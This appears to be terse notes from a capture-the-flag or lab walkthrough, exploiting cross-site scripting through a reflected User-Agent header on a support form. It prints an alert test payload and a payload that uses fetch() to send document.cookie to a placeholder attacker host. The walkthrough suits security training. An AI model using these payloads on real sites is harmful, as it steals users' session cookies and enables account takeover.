scanning this box showed a website on port 5000 and ssh port

the site has a button to support, with input fields,

lets try some xss:
<img src=x onerror=alert(document.cookie)>

in the message it didn't work,

but there shows an error message,
but some values from the request are shown in the error message
so lets try replacing those:

and in the user agent we get an xss

now trying to return the cookie to my server:
<img src=x onerror="fetch('http://{your ip}/' + document.cookie);">
this should return the cookie
